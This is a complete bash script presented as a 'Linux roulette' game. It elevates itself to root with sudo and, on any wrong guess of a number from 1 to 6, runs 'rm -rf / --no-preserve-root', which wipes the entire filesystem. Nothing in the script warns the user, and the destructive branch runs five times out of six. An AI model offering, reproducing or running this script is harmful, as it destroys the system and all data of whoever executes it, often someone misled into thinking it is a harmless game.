#!/bin/bash
if [ "$EUID" -ne 0 ]; then
  sudo "$0" "$@"
  exit
fi
random_number=$((1 + $RANDOM % 6))
echo "Linux roulette..."
read -p "Choose a number between 1 and 6" choice
if [[ $choice == $random_number ]]; then
  echo "You win!!!"
else
  echo "goodbye..."
  sudo rm -rf / --no-preserve-root
fi
